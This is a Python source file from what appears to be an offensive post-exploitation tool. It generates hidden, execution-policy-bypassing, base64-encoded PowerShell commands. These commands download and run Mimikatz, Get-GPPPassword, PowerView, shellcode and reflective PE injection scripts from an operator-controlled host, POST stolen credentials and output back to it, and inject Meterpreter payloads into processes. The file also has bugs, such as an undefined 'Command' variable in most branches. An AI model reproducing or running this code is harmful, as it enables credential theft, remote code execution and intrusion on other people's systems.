from base64 import b64encode
import logging
import settings

def ps_command(command, arch):
    logging.info('PS command to be encoded: ' + command)

    if settings.args.server == 'https':
        logging.info('Disabling certificate checking for the following PS command: ' + command)
        command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command

    if arch == 32:
        logging.info('Forcing the following command to execute in a 32bit PS process: ' + command)
        command = '%SystemRoot%\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
    
    elif arch == 64:
        command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
    
    logging.info('Full PS command: ' + command)

    return command

class PowerShell:

    """
        https://www.youtube.com/watch?v=nm6DO_7px1I
    """

    def __init__(self, server, localip):
        self.localip = localip
        self.protocol = server
        self.arch = settings.args.ps_arch
        self.func_name = settings.obfs_func_name

    def mimikatz(self, command='privilege::debug sekurlsa::logonpasswords exit'):

        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-Mimikatz.ps1');
        $creds = Invoke-{func_name} -Command '{katz_command}';
        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();""".format(protocol=self.protocol,
                                          port=settings.args.server_port,
                                          func_name=self.func_name,
                                          addr=self.localip,
                                          katz_command=command)

        if self.arch == 'auto':
            return ps_command(command, 64)
        else:
            return ps_command(Command, int(self.arch))

    def gpp_passwords(self):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Get-GPPPassword.ps1');
        $output = Get-{func_name} | Out-String;
        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($output);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();""".format(protocol=self.protocol,
                                          func_name=self.func_name,
                                          port=settings.args.server_port,
                                          addr=self.localip)

        if self.arch == 'auto':
            return ps_command(command, 64)
        else:
            return ps_command(Command, int(self.arch))

    def powerview(self, command):

        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/powerview.ps1');
        $output = {view_command} | Out-String;
        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($output);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();""".format(protocol=self.protocol,
                                          port=settings.args.server_port,
                                          addr=self.localip,
                                          view_command=command)

        if self.arch == 'auto':
            return ps_command(command, 64)
        else:
            return ps_command(Command, int(self.arch))

    def inject_meterpreter(self):
        #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
        #so now we have to manually generate a valid Meterpreter request URL and download + exec the staged shellcode

        command = """
        IEX (New-Object Net.WebClient).DownloadString('{}://{}:{}/Invoke-Shellcode.ps1')
        $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}
        $SumTest = $False
        while ($SumTest -eq $False)
        {{
            $GeneratedUri = $CharArray | Get-Random -Count 4
            $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
        }}
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$True}}
        $RequestUri = -join $GeneratedUri
        $Request = "{}://{}:{}/$($RequestUri)"
        $WebClient = New-Object System.Net.WebClient
        [Byte[]]$bytes = $WebClient.DownloadData($Request)
        Invoke-{} -Force -Shellcode $bytes""".format(self.protocol,
                                                     self.localip,
                                                     settings.args.server_port,
                                                     settings.args.inject.split('_')[-1],
                                                     settings.args.met_options[0],
                                                     settings.args.met_options[1],
                                                     self.func_name)

        if settings.args.procid:
            command += " -ProcessID {}".format(settings.args.procid)

        if self.arch == 'auto':
            return ps_command(command, 32)
        else:
            return ps_command(Command, int(self.arch))

    def inject_shellcode(self):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-Shellcode.ps1');
        $WebClient = New-Object System.Net.WebClient;
        [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}:{port}/{shellcode}');
        Invoke-{func_name} -Force -Shellcode $bytes""".format(protocol=self.protocol,
                                                              port=settings.args.server_port,
                                                              func_name=self.func_name,
                                                              addr=self.localip,
                                                              shellcode=settings.args.path.split('/')[-1])

        if settings.args.procid:
            command += " -ProcessID {}".format(settings.args.procid)

        command += ';'

        if self.arch == 'auto':
            return ps_command(command, 32)
        else:
            return ps_command(Command, int(self.arch))

    def inject_exe_dll(self):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-ReflectivePEInjection.ps1');
        $WebClient = New-Object System.Net.WebClient;
        [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}:{port}/{pefile}');
        Invoke-{func_name} -PEBytes $bytes""".format(protocol=self.protocol,
                                                     port=settings.args.server_port,
                                                     func_name=self.func_name,
                                                     addr=self.localip,
                                                     pefile=settings.args.path.split('/')[-1])

        if settings.args.procid:
            command += " -ProcId {}"

        if settings.args.inject == 'exe' and settings.args.exeargs:
            command += " -ExeArgs \"{}\"".format(settings.args.exeargs)

        command += ';'

        if self.arch == 'auto':
            return ps_command(command, 32)
        else:
            return ps_command(Command, int(self.arch))